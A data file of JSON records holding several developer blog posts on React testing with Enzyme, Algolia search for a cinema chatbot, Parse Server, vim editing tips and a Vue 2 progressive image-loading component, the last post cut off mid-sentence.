{"article": "\r\n\t\t\t\t\t\t\t\t\t\tReact has quickly climbed its way to being a top framework choice for Javascript single page applications.\nWhat\u2019s not to like?\n\nA declarative syntax for UI\nVirtual-DOM for performance\nThe possibility of server-side rendering.\n\nThere is however one area that could be improved; its built-in testing utilities \u2013 and this is where Enzyme steps in as the must have tool for front-end React testing.\nThis is an example of a test using the native utilities of the framework:\nconst myRenderer = ReactTestUtils.createRenderer();\r\nmyRenderer.render(<myComponent/>);\r\nconst output = renderer.getRenderOutput();\r\nconst result =  scryRenderedDOMComponentsWithTag(output, div);\r\n\r\nexpect(result[0].props.children).toEqual([\r\n    <p>Title</p>\r\n]);\r\n\nIts verbose, long-winded and not that fun to develop with. The alternative put forward, Enzyme, brings it down to something much more expressive and readable:\nconst wrapper = shallow(<myComponent/>);\r\nexpect(wrapper.find('div').html()).to.equal('<p>Title</p>');\r\n\nUsing the all-powerful find function\nEnzyme uses cheeriojs \u2013 a small library that implements a subset of jQuery\u2019s core functionalities and makes manipulating components simple. The find() function, used in the example above, can be applied to HTML, JSX and CSS alike \u2013 this is key to Enzyme; It gives you the ability to target DOM elements in a clear and concise manner. Here are a few examples of how it can be applied:\ncomponentToTest.find('div'); // On HTML tags\r\ncomponentToTest.find('.pretty > .red-row'); // On CSS selectors\r\ncomponentToTest.find('div .nice-style'); // Both !\r\ncomponentToTest.find('label[visible=true]'); // On properties\r\n\nThe different rendering modes\n\nTo understand Enzyme\u2019s key strengths, let\u2019s dive a little into how it simulates components and DOM elements. Although based off react-test-utils, there is enough abstraction that the rendering of a component comes down to 3 functions \u2013 shallow, mount and render. Basically ;\n\n\nShallow rendering : Is useful to test a component in isolation of every other. In the typical React pattern of smart and dumb components, shallow rendering is usually used to test \u2018dumb\u2019 components (stateless components) in terms of their props and the events that can be simulated.\n\n\nMounting : Also known as full DOM rendering, it allows you to render a part of the DOM tree and it also gives you access to the lifecycle methods of React components (ComponentWillMount, ComponentWillReceiveProps , etc\u2026)\n\n\nStatic rendering : Is sparsely used but when it is the case, serves as means of testing plain JSX / HTML.\n\n\nPrior knowledge\nThis article assumes a classic React stack making use of npm scripts, webpack as a module bundler along with ES6 syntax and it will detail a simple approach to testing your React application.\nYou may also want to have a quick look at this article if your application uses Redux (link to the article), as it is a common library used in React applications and knowing how to test it may be helpful, in complement to what is explored in this article.\nEnjoy!\nSetup\nEnzyme is completely agnostic to the test runner and assertion libraries that you use; it works with mocha, AVA, Jest\u2026 you choose! In this article we will use, without going into too much detail, the following testing tools \u2013 so you can keep using your favourites, for me it\u2019s:\n\nJest as the test runner (although it also handles assertions and spies, I still want to use chai and sinon alongside it because of the syntaxic addons with chai-enzyme and sinon-chai).\nChai as the assertion library.\nSinon for mocks, stubs and test spies.\n\nFor jest the setup is simple, just remember to suffix your test files with .test.js (default configuration):\nnpm install --save-dev jest\r\n\nAnd add the following scripts to your package.json scripts object :\n\"client:test\": \"NODE_ENV=test jest\",\r\n\"client:test:watch\": \"NODE_ENV=test jest --watch\"\r\n\nAlong with an object at the root of the package.json with jest as a key that configures the jest testing tool (I\u2019ll just include a few key options):\n\"jest\": {\r\n    \"rootDir\": \"./client/src\",\r\n    \"moduleNameMapper\": {\r\n        \"^.+\\\\.(css|less)$\": \"<rootDir>/CSSStub.js\"\r\n    },\r\n    \"collectCoverage\": true,\r\n    \"coverageDirectory\": \"<rootDir>/../../coverage\",\r\n    \"verbose\": true,\r\n    \"coveragePathIgnorePatterns\": [\r\n        \"<rootDir>/../../node_modules/\"\r\n    ]\r\n}\r\n\nImportant: The moduleNameMapper options allows you to mock a module for files that match a particular extension. In projects using webpack it is quite typical to load css inline using the webpack css-loader. The problem is Jest doesn\u2019t know how to interpret the css , so instead make a stub that resolves all inline styles to an empty object contained in <rootDir>/CSSStub.js\nAlso don\u2019t forget to include these libraries of course!\nnpm install --save-dev enzyme chai-enzyme sinon\r\n\nShallow render and the enzyme API in general\nA shallow rendered and a mounted component, have the same methods exposed but different use cases (as in, you will find the same API in the Enzyme docs for both). As a rule of thumb, shallow render is for unit testing and will probably be used for the majority of your test cases. Mounting would be more for a form of \u2018front-end integration testing\u2019 (seeing how a change in one component propagates to other components lower in the DOM tree).\nTesting your component in terms of data\nLet\u2019s use a small snippet of code that renders a rectangle of a certain color, some text and a checkbox. Not an enthralling example, but a useful one in showing how enzyme works.\nimport React, { PureComponent } from 'react';\r\n\r\nclass ColoredRectangleComponent extends PureComponent {\r\n  render() {\r\n    return (\r\n      <div className={this.props.elementClass}>\r\n        {`Square text : ${this.props.text}`}\r\n        <input\r\n          type=\"checkbox\"\r\n          id=\"checked\"\r\n          value=\"active\"\r\n          checked=\"checked\"\r\n          onClick={(event) => { this.props.onCheckboxChange(event); }}\r\n        />\r\n      </div>\r\n    );\r\n  }\r\n}\r\n\r\nexport default ColoredRectangleComponent;\r\n\nWe want to test three things to begin with; we expect a div, with the correct class and some text. Note that once you have rendered a component for the test, you can easily control the data it handles with setProps() and setState(). You can also access the props and state of a component with props() and state(). This is particularly interesting when testing different outcomes in your component\u2019s display (for instance; hiding part of a component, checking if an error label appears, etc\u2026).\nimport React from 'react';\r\nimport chai, { expect } from 'chai';\r\nimport chaiEnzyme from 'chai-enzyme';\r\nimport { shallow } from 'enzyme';\r\nimport sinon from 'sinon';\r\nimport ColoredRectangleComponent from './enzyme';\r\n\r\nchai.use(chaiEnzyme());\r\n\r\nconst clickSpy = sinon.spy();\r\nconst props = {\r\n  checked: true,\r\n  elementClass: 'red-square',\r\n  text: 'Enzyme rocks',\r\n  onCheckboxChange: clickSpy,\r\n};\r\n\r\nconst container = shallow(<ColoredRectangleComponent {...props} />);\r\n\r\ndescribe('tests for <ColoredRectangleComponent> container', () => {\r\n  it('should render one div', () => {\r\n    // You can target DOM, its children(), or an element at() a position\r\n    expect(container.find('div').length).to.equal(1);\r\n  });\r\n\r\n  it('should render one div with the correct class applied', () => {\r\n    expect(container.find('div').hasClass('red-square')).to.equal(true);\r\n  });\r\n\r\n  it('should contain the text passed as props', () => {\r\n        expect(container.text()).to.equal('Square text : Enzyme rocks');\r\n        // Here is an alternative making use of html()\r\n        expect(container.find('p').html()).to.equal('<p>Square text : Enzyme rocks</p>');\r\n  });\r\n\r\n    [...]\r\n\nTesting your component in terms of events\nYou are going to want to simulate user interactions with your component. This is where chai-enzyme steps in to provide a variety of assertion addons that will simplify your test syntax. As we are using a checkbox, a quick look at the docs tell us that we are interested by (not.?)to.be.checked().\n    [...]\r\n\r\n    it('should render a checked checkbox if prop value is true', () => {\r\n        expect(container.find('#checked')).to.be.checked();\r\n    });\r\n\r\n    [...]\r\n\nIf we refer back to our tested component, a function is passed down through props and should be triggered upon clicking the element it is bound to (in this case the input tag). For the moment, event propagation and more complex mouse interactions are actively being developped but most use cases are already covered.\n    [...]\r\n\r\n    it('should trigger onCheckboxChange when simulating a click event on checkbox', () => {\r\n    container.find('#checked').simulate('click');\r\n    expect(clickSpy.calledOnce).to.equal(true);\r\n  });\r\n\r\n});\r\n\nMounting a component\nThere may be instances where you don\u2019t want to fully mount a part of the DOM just to test one nested component inside a shallowRendered component. In this case use dive() \u2013 but for every other complex case where several nested components need to be tested together, use mount. Let\u2019s have a look at a parent component that makes use of our ColoredRectangleComponent:\nimport React, { Component } from 'react';\r\nimport _ from 'lodash';\r\nimport ColoredRectangleComponent from './enzyme';\r\n\r\nclass Parent extends Component {\r\n  constructor(props) {\r\n    super(props);\r\n    this.state = {\r\n      squareList: [\r\n        {\r\n          text: 'number 1',\r\n          checked: true,\r\n          elementClass: 'red',\r\n        },\r\n        {\r\n          text: 'number 2',\r\n          checked: false,\r\n          elementClass: 'blue',\r\n        },\r\n      ],\r\n    };\r\n  }\r\n\r\n  componentDidMount() {}\r\n\r\n  render() {\r\n    return (\r\n      <div >\r\n        {_.map(this.state.squareList, (square, index) => {\r\n          return (\r\n            <ColoredRectangleComponent\r\n              key={index}\r\n              checked={square.checked}\r\n              elementClass={square.elementClass}\r\n              text={square.text}\r\n              onCheckboxChange={() => { return null; }}\r\n            />\r\n          );\r\n        })}\r\n      </div>\r\n    );\r\n  }\r\n}\r\n\r\nexport default Parent;\r\n\nAgain we\u2019ll have a look into two simple test cases; checking if the component does mount and whether or not it renders components correctly according to its state. We are expecting 2 ColoredRectangle components with the correct css classes attributed to them.\nimport React from 'react';\r\nimport { expect } from 'chai';\r\nimport { mount } from 'enzyme';\r\nimport sinon from 'sinon';\r\n\r\nimport Parent from './parent';\r\nimport ColoredRectangleComponent from './enzyme';\r\n\r\n\r\ndescribe('tests for <Parent> container', () => {\r\n  it('should test that the component mounts', () => {\r\n    sinon.spy(Parent.prototype, 'componentDidMount');\r\n    const container = mount(<Parent />);\r\n    expect(Parent.prototype.componentDidMount.calledOnce).to.equal(true);\r\n  });\r\n\r\n  it('should render 2 squares with the correct classes', () => {\r\n    const container = mount(<Parent />);\r\n    const expectedClassNamesList = ['red', 'blue'];\r\n\r\n    expect(container.find(ColoredRectangleComponent).length).to.equal(2);\r\n    container.find('div').forEach((node, index) => {\r\n      expect(node.hasClass(expectedClassNamesList[index])).to.equal(true);\r\n    });\r\n  });\r\n});\r\n\nConclusion\nThe tools provided by enzyme make testing React applications easy with a minimal setup cost. The documentation  is simple and well illustrated with many examples and different tips. Finally, if you need to debug a component, Enzyme also integrates a debug tool that quite simply prints the rendered element to the console as JSX. Just use console.log(container.debug()). Happy testing !\nUseful links :\n\nEnzyme docs\nJest docs\nChai enzyme\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAmbroise Laurent\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Thedo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIn my first article, I talked about creating an MVP with a Chatbot and showed an example with Cinebot\nBut getting the bot up and running wasn\u2019t enough.\nIt needed to be able to search complex data from text and location queries sent by the user through Messenger.\nSo I started to look for a cheap and flexible solution to store and retrieve data. At around the same time I heard about Algolia, a French company\u00a0providing exhaustive search capabilities through a SaaS platform, and decided it was worth trying out.\nIn this article I\u2019ll explain how I tuned Algolia to provide relevant search for my users in just a few hours.\nIntroduction\nAlgolia acts as a data store, so I will fetch the screenings data daily using cron jobs and upload it there.\nThis will allow my chatbot to use Algolia\u2019s exhaustive search capabilities to return relevant data.\nHere is a diagram to show what the architecture of the project looks like:\n\n\ud83d\udcb5 Algolia Free Plan: Discovery\nAlgolia Free Plan includes 10,000 records and 100,000 operations (an operation can be adding a record or querying the database).\nIt\u2019s quite limited but enough for my MVP: creating a chatbot to help Parisians find showtimes in their city.\nFor approximately all the Paris and surrounding area, I have 2,500 records per day.\nWhich means ~30\u00d72,500 = 75,000 operations per month, which fits into the free plan.\nN.B: In order to use Algolia Free Plan, you must put their logo somewhere in your product\nCreating an index and getting the keys \ud83d\udc46\nFirst you need to go to https://www.algolia.com/explorer/indices and to create a new index (the equivalent of a MongoDB collection, that will hold your records).\nGive it the name you want, I called mine cine_seances.\nThen head to https://www.algolia.com/api-keys to get your Application ID and Admin API Key.\nThen we\u2019re ready to roll.\nData Description\nThe searchable items are releases: they represent all the screenings for a given movie in a given cinema, on a given day:\n{\r\n  \"place\": {\r\n    \"name\": \"Le Cin\u00e9ma des Cin\u00e9astes\",\r\n    \"city\": \"Paris 17e arrondissement\",\r\n    \"postalCode\": \"75017\",\r\n  },\r\n  \"movie\": {\r\n    \"title\": \"Moonlight\",\r\n    \"language\": \"Anglais\",\r\n    \"vo\": true,\r\n    \"posterUrl\": \"http://images.allocine.fr/pictures/17/01/26/09/46/162340.jpg\",\r\n    \"pressRating\": 4.18421,\r\n    \"userRating\": 4.07561159,\r\n    \"url\": \"http://www.allocine.fr/film/fichefilm_gen_cfilm=242054.html\",\r\n    \"is3D\": false,\r\n    \"releaseDate\": \"2017-02-01\",\r\n    \"trailerUrl\": \"http://www.allocine.fr/video/player_gen_cmedia=19565733&cfilm=242054.html\"\r\n  },\r\n  \"date\": \"2017-02-24\",\r\n  \"times\": {\r\n    '13:15': 'https://tickets.allocine.fr/paris-le-brady/reserver/F191274/D1488024900/VO',\r\n    '17:30': 'https://tickets.allocine.fr/paris-le-brady/reserver/F191274/D1488040200/VO',\r\n    '19:45': 'https://tickets.allocine.fr/paris-le-brady/reserver/F191274/D1488048300/VO',\r\n    '22:00': 'https://tickets.allocine.fr/paris-le-brady/reserver/F191274/D1488056400/VO'\r\n  },\r\n  \"_geoloc\": {\r\n    \"lat\": 48.883658,\r\n    \"lng\": 2.327202\r\n  }\r\n}\r\n\nUpdating the data\nAlgolia provides clients for many languages which means you can work with the language of your choice.\n\nI went\u00a0with Javascript since my bot is developed in Javascript. Hence, I needed to install two Javascript packages and add the corresponding two lines on top of every .js file where I\u2019ll use Algolia:\nnpm install --save algoliasearch\r\nnpm install --save algoliasearch-helper\r\n\nconst algoliasearch = require('algoliasearch');\r\nconst algoliasearchHelper = require('algoliasearch-helper');\r\n\nUploading fresh data\nThe clients allow for batch uploading of JSON arrays, which is quite convenient.\nHowever two days of screenings are contained in a 3.4Mb JSON array, and batch uploading the entire array often timed-out.\nA solution is to upload small chunks of 100 screenings. With asynchronous Javascript, uploading does not take more than 5 seconds.\nconst algoliaIndexName = 'cine_seances';\r\nconst algolia = algoliasearch(APP_ID, ADMIN_API_KEY, {\r\n    timeout: 5000\r\n});\r\n\r\nconst showtimes = require('./showtimes.json');\r\nconst _ = require('lodash');\r\nconst index = algolia.initIndex(algoliaIndexName)\r\n_(showtimes).chunk(100).forEach((chunk) => {\r\n  index.addObjects(chunk, function(err, content) {\r\n    // ...\r\n  });  \r\n});\r\n\nDeleting old data\nSince the free plan can only contain two days worth of data, every upload of a new batch means clearing all the records currently held in the database before uploading new ones.\nindex.clearIndex(function(err, content) {\r\n  // OMG TOTAL WIPEOUT \ud83d\ude31\r\n  _(showtimes).chunk(100).forEach((chunk) => {\r\n    index.addObjects(chunk, function(err, content) {\r\n      // \ud83d\udcaf\r\n    });  \r\n  });\r\n});\r\n\nAlgolia Configuration\nOnce the data is in there, it\u2019s very simple to select the fields that will be searchable through Algolia, and the order in which they should be displayed to the user. It all happens in the index dashboard at https://www.algolia.com/explorer#?index=cine_seances\nSearchable Attributes\n\nAfter experimenting a bit, I found out the following order for the attributes that were important in the search:\n1) Postal code\n2) Movie Title\n3) City\n4) Theater Name\nAll that is needed is to add the attributes through the interface and order them in the way I want them to be prioritized.\nEnabling Geolocation \ud83c\udf0f\nA key feature I needed\u00a0in the bot was the ability for the users to send their location and discover screenings around them.\nFacebook Messenger allows you to prompt the user for his location, which can be useful as a fallback when the user does not understand how to talk to your chatbot.\nWhen no screening is found based on the query, the bot prompts the user to send its location instead.\nAnd then getting the location back from the message:\nif(event.message && event.message.attachments) {\r\n    const attachment = event.message.attachments[0];\r\n    if(attachment.type === 'location') {\r\n        const location = {\r\n          'latitude': attachment.payload.coordinates.lat,\r\n          'longitude': attachment.payload.coordinates.long,\r\n        }\r\n    }\r\n}\r\n\nEnabling geolocation search is simple with Algolia as you only need to add a _geoloc field to your records and enable Geosearch in the Dashboard:\n{\r\n  ...\r\n  \"_geoloc\": {\r\n    \"lat\": 48.883658,\r\n    \"lng\": 2.327202\r\n  }\r\n}\r\n\n\nThen by adding a query parameter aroundLatLng, you will get the results sorted based on distance.\nYou even get the distance in meters to the cinema, which you can then display to the user.\nalgoliaHelper.setQueryParameter('getRankingInfo', true);\r\nalgoliaHelper.setQueryParameter('aroundLatLng', `${location.latitude},${location.longitude}`);\r\n\r\nalgoliaHelper.setQuery('').search();\r\nalgoliaHelper.on('result', (result) => {\r\n  const hits = result.hits;\r\n  console.log(`Closest result is ${hits[0]._rankingInfo.matchedGeoLocation.distance} meters away.`)\r\n});\r\n\nCustom Ranking \u2b50\nSince I also had the information about the movie ratings, I wanted the results to be displayed in an order based not only on the proximity, but also on the quality of the movie.\nTo do so I defined Custom Ranking Attributes just below the searchable-attributes in the console, and Algolia sorts it out by itself.\n\nFaceting for Same Day Retrieval\nAfter setting up the ordering of results, I wanted to retrieve only the screenings for the date of today.\nTo do so I used faceting which allows me to index a field with a limited number of discrete values to make them easily searchable.\nBy faceting the date field, I was able to query all the showtimes for today\u2019s date.\n\nthis.algoliaParams = { facets: ['date'], hitsPerPage: 10 };\r\nconst algoliaHelper = algoliasearchHelper(this.algolia, this.algoliaIndexName, this.algoliaParams)\r\n\r\nalgoliaHelper.addFacetRefinement('date', today);\r\nalgoliaHelper.setQuery('La La Land').search();\r\nalgoliaHelper.on('result', (result) => {\r\n  const hits = result.hits;\r\n  console.log(`${hits.length} showtimes for La La Land today.`)\r\n});\r\n\nTypo Tolerance\nWith Algolia you can also fine tune typo-tolerance on every field: if it should be enabled or not, the minimum number of characters before accepting 1 or 2 typos, and if stop words should be removed for example.\nFor a more exhaustive list, scroll down to this section on your index page.\n\nThat\u2019s it, folks!\nIn a few hours, I was able to get Algolia configured to perform complex queries on my dataset and provide fast and relevant search to my users based on what their textual query as well as their location if they wish to share it.\n\u00a0\n\nI\u2019d definitely recommend Algolia to anyone who wants to perform search on a slightly complicated dataset without the overhead of setting up an in-house solution.\nHowever, getting more space and operation capacity comes at a cost: 49,9$/month for Starter Plan with 100\u2019000 records and 1\u2019000\u2019000 operations. So you\u2019d better have a product that makes money \ud83d\udcb7\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJeremy Gotteland\r\n  \t\t\t\r\n  \t\t\t\tFull-Stack Developer @ TheodoUK in London. When I don't debug my code  with my rubber duck, you can find me coding useful (and less useful) products with loads of emojis.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tInteresting fact: In October 2016, for the first time, the majority of the Internet traffic came from mobile devices.\nIt confirms mobile devices market as the priority for the next years and it motivates more and more people to jump into the adventure of \u201cCreate my App\u201d.\n\n  \nSome developers looking for a good app idea. (2017)\n\nBut developing an app is not an easy task. Indeed, besides obvious features for your app, you will need a complete infrastructure behind, with a database, a server, handling notifications, etc.\nTaking care of all this stuff takes a lot of time, work, tears, and doesn\u2019t bring business value. And as a developer, it requires a whole new set of skills to handle it.\nFor instance, you\u2019re at a hackathon. You want a quick prototype of your app, but you fail completely because of your broken backend which you spent half of the time to configure. Annoying, isn\u2019t it?\nAre we sentenced to write CRUD and setup backends all our lives? I say no!\n\n  \n\nIntroducing the BaaS\nAnd to support my No, I present the BaaS (for Backend as a Service). It will allow you to connect your mobile apps to cloud-based services by providing an API and SDKs. This includes key features like:\n\nUser management\nCloud storage\nPush notifications\nIntegration with social networking services\n\nAnd it\u2019s a booming market: in 2012, the BaaS market was worth 215 Million USD and it should be worth 28.10 Billion USD by 2020.\nObviously, competition is tough. How can we choose among all the BaaS offers?\n\n  \n\nParse Server\nDon\u2019t worry, I\u2019ve got this. For this perilous adventure, we will use Parse Server, a wonderful and powerful toolbox.\n\n  \n\n\nBut before using it, where does it come from?\nA quick history\nParse was founded in 2011. The firm was developing at the time Parse Platform, a BaaS (surprising, isn\u2019t it? \u00af\\_(\u30c4)_/\u00af).\nIt quickly gained in popularity to the point of being acquired by Facebook in 2013 for $85 million. In 2014, Parse was reported to power 500,000 mobile apps!\nSadly, in January 2016, Facebook announced that it would close Parse down, with services effectively shutting down in January 2017. But good news, Parse did open the application source code in order to allow users to perform the migration: this was the birth of Parse Server.\nWhat does it do?\nAlthough Parse Server is no longer really a BaaS, it does everything that I said.\nOne of the big advantages of Parse compared to its competitors is its impressive choice of SDK. Whether you need a common database for your iOS and Android apps, or if you want to store all the data from your Arduinos in a same place, Parse Server\u2019s got your back.\nIt has a dashboard where you can administrate multiple Parse instances, support Push notifications, Cloud Code, and soon Analytics.\n\n  \n  The Parse Server Dashboard\n\n\nIn addition, it\u2019s open source with almost 30k stars in total (counting SDKs, Dashboard, etc.) on GitHub. It\u2019s a living project which evolves very quickly.\nMy experience\nThere are other \u201creal\u201d BaaS existing on the market. Firebase, by Google, is a really good one. I chose Parse here because when I started, there wasn\u2019t much choice, and when I had this need again a few months ago, Parse Server was here, waiting for me, as a solid competitor. Since, I don\u2019t regret my choice. Being an active open-source project makes the whole thing more lively, more dynamic, and likely to evolve quickly. And if you\u2019re afraid to install Parse Server infrastructure on a server, many well-known providers has ready-to-go offers for you (like Heroku, AWS, Windows Azure, etc.).\nI used it on personal projects in Python, Ionic 2 and soon on my Rasberry Pi and Arduinos. It helps me a lot, saving me a lot of time and tears. Even if my projects were small, if you are worried in terms of reliability for real projects, it was made for this in the first time.\nNow, it\u2019s your turn\nIf you have an MVP to do by tomorrow and you still haven\u2019t started, this is your moment.\nTo start quickly, you have:\n\nThe Parse Platform website\nThe Parse Server GitHub repository\nThe documentation\nA docker-compose ready Parse Server\n\nYou are only one-click away if you use online providers (such as Heroku, Azure, AWS)\u2026\nEnjoy!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAdrien Lacroix\r\n  \t\t\t\r\n  \t\t\t\tWeb Developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nkbd {\n  display: inline-block;\n  padding: 3px 5px;\n  font-size: 11px;\n  line-height: 10px;\n  color: #555;\n  vertical-align: middle;\n  background-color: #fcfcfc;\n  border: solid 1px #ccc;\n  border-bottom-color: #bbb;\n  border-radius: 3px;\n  box-shadow: inset 0 -1px 0 #bbb\n}\n\nSometimes, you have to ssh on a server to fix some configuration files or to test a feature that you cannot test locally. You don\u2019t have your favourite text editor with all your configuration here.\nMost of the time, you have to rely on vim or nano in this situation.\nYour coworkers told you that nano is for newbies and you want to gain some street credibility, so you use vim.\n\nYour beard is not long enough for emacs.  You wouldn\u2019t be here anyway\nHere is a guide to help you solve the annoying problems that you may face with vim.\nWhen you forget to sudo\nYour server has a configuration issue, and you have to fix the configuration file, so you go vim <path-to-your-config-file>.\nYou make a bunch of changes, Esc:x to save the file and exit and then:\nE505: \"<your-config-file>\" is read-only (add ! to override)\nYou forgot about the sudo and now you think you have to drop your changes, and open vim again with sudo this time.\n\nFortunately, there is a solution: :w !sudo tee %\nLet\u2019s analyse this command:\n\n\n:w doesn\u2019t write in your file in this case. If you are editing file1 with vim and type :w file2, you will create a new file named file2 with your buffer and file1 will be left untouched.\nHere, you write to the \u201cfile\u201d !sudo tee %.\n\n\n!sudo: The bang ! lets you execute a command as if you were in a shell, in this case sudo to get superusers rights.\n\n\ntee sounds like the letter T for a reason: it acts like a T-shaped pipe. It takes a filename in argument, and redirects the output to the file you gave it and to the standard output.\n\n\n% refers to the current file in vim.\n\nYou now have the full equation: :w writes the buffer into tee (with superuser rights) that redirects the buffer into the current file (and to the standard output, but that\u2019s not useful here)\n\n\nPastemode\nWhat\u2019s more frustrating than pasting a snippet of code and having your formatting all messed up, especially in languages like Python where indentation is part of your code?\nExample:\n\nYou can switch to paste mode which allows you to paste text as is.\nSimply type :set paste in normal mode and then you\u2019re good to go (do not forget to switch to insert mode before pasting). Look carefully, everything happens on the last line of the video.\n\nYou might wonder: why not stay in paste mode all the time? Well it changes some of the configurations of vim like smarttabs and smartindent.\nHowever, if you have a lot of copy / pasting to do, you can use set pastetoggle=<F2> to set a toggle. Pressing F2 will switch paste mode on and off. You can replace F2 with any key you like. More info with :help paste.\nSearching for text\nChances are that you will look for something in the file you are trying to edit.\nIn normal mode simply type /<your-search>.\nIt will highlight text that matches and you can press n to go to the next or N to go to the previous occurrence.\nNotice how the text is left highlighted even after you entered insert mode? You can stop the highlighting by typing :noh as in \u201cno highlight\u201d.\n\nBlock comment\nSometimes, you have to test your file with a part of the code removed and the quickest way to do this without losing it is to comment it.\nTo comment multiple lines at once, simply put the cursor on the first column by pressing 0 at the top (or bottom) of the block you want to comment and press Ctrl + v\nYou are now in visual block mode where you can select a bloc of text, in our case a column. Go down or up and select the lines you want to comment. Press Shift + I and insert your programming language comment symbol. It will only print on the highest row selected. Then press Esc Esc and boom, your lines are commented!\nPress u to cancel the change, or simply bloc select it again and press x.\n\nIndent\nPress v to select text and then press  <  or  >  to indent in either direction. You can combine it with navigation actions. For example  >   G  will indent all lines from the cursor to the end of the file.\n\nHowever, it will indent your file of shiftwidth spaces. By default this value is 8 and that is quite big. You can use :set shiftwidth=<your-value> to adapt it to the indent style of your file.\nBonus: quick navigation\n\n$ goes to end of line\n0 goes to the beginning of the line (column 1) while ^ goes to the first non blank character\ngg goes to the top of the file while G goes to the bottom\n% goes to the matching parenthesis/bracket\nCtrl + F goes one page down and Ctrl + B goes one page up (think forward and backward to remember it)\nu cancels your last action and Ctrl + r reapplies it\n\nI hope this article made Vim less painful.\nYou can share your tips in the comments.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAlexandre Chaintreuil\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tQuick summary of part 1\nI\u2019m quite fond of the way Medium displays its images while they\u2019re loading.\nAt first they display a grey placeholder, then displays a small version of the image \u2013 something like 27\u00d717 pixels.\nThe trick is that most browsers will blur a small image if it is streched out.\nFinally, when the full-size image is downloaded, it replaces the small one. You can see a live demo of what I had done on this Codepen.\nIn this post I intend to make a component that is as close as possible to what Medium actually does, as it is explained on this excellent post by Jos\u00e9 M. Perez.\nAnd I have also switched from Vue 1 to Vue 2 \ud83d\ude09\nAdding a placeholder behind the images\nLet\u2019s add the first element which we wait for the images to be loaded: a grey placeholder.\n\nIn our template we have 3 elements:\n\na grey placeholder that will be shown while the low-resolution version of the image is not loaded yet\na low-resolution image that will be shown streched out while the high-resolution is not loaded yet\na high-resolution image that will be displayed to the user\n\nThe javascript logic will set the sources of the images and display the right element depending on which images are already loaded.\nTo load the images we\u2019ll use the mounted function of the component.\nTo set the \u201cstate\u201d of the component, we\u2019ll use a data called currentSrc that will be initialized to null and will take the value of the source of the image that should be displayed.\nThis far, the Vue component should look like this:\n<template>\r\n  <div v-show=\"currentSrc === null\" class=\"placeholder\"></div>\r\n  <img v-show=\"currentSrc === hiResSrc\" :src=\"lowResSrc\"></img>\r\n  <img v-show=\"currentSrc === hiResSrc\" :src=\"hiResSrc\"></img>\r\n</template>\r\n\r\n<style scoped>\r\n  img, .placeholder {\r\n    height: 600px;\r\n    width: 900px;\r\n    position: absolute;\r\n  }\r\n  .placeholder {\r\n    background-color: rgba(0,0,0,.05);\r\n  }\r\n</style>\r\n\r\n<script>\r\n  export default {\r\n    props: [\r\n      'hiResSrc',\r\n      'loResSrc'\r\n    ],\r\n    data: function() {\r\n      return {\r\n        currentSrc: null // setting the attribute to null to display the placeholder\r\n      }\r\n    },\r\n    mounted: function () {\r\n      var loResImg, hiResImg, that, context;\r\n      loResImg = new Image();\r\n      hiResImg = new Image();\r\n      that = this;\r\n\r\n      loResImg.onload = function(){\r\n        that.currentSrc = that.loResSrc; // setting the attribute to loResSrc to display the lo-res image\r\n      }\r\n      hiResImg.onload = function(){\r\n        that.currentSrc = that.hiResSrc; // setting the attribute to hiResSrc to display the hi-res image\r\n      }\r\n      loResImg.src = that.loResSrc; // loading the lo-res image\r\n      hiResImg.src = that.hiResSrc; // loading the hi-res image\r\n    }\r\n  }\r\n</script>\r\n\nAdding transitions\n\nThen we need to add some transitions when the value of currentSrc changes.\nTo be more accurate, we want to fade-in/out every element as they appear/disappear.\nVue.js lets you handle CSS transitions in a pretty easy way by adding and removing classes.\nAs we have multiple elements to transition between we have to use a transition group:\n<template>\r\n  <transition-group name=\"blur\" tag=\"div\">\r\n    <div v-show=\"currentSrc === null\" key=\"placeholder\" class=\"placeholder blur-transition\"></div>\r\n    <img v-show=\"currentSrc === loResSrc\" :src=\"loResSrc\" key=\"lo-res\" class=\"blur-transition\"></canvas>\r\n    <img v-show=\"currentSrc === hiResSrc\" :src=\"hiResSrc\" key=\"hi-res\" class=\"blur-transition\"></img>\r\n  </transition-group>\r\n</template>\r\n\nHere is how Vue.js handles the transition when the value of currentSrc changes from null to loResSrc:\n\nthe \u2018blur-leave\u2019 class is added to the placeholder, thus triggering the transition for the placeholder\nthe \u2018blur-enter\u2019 class is added to the low resolution image\nthe placeholder is 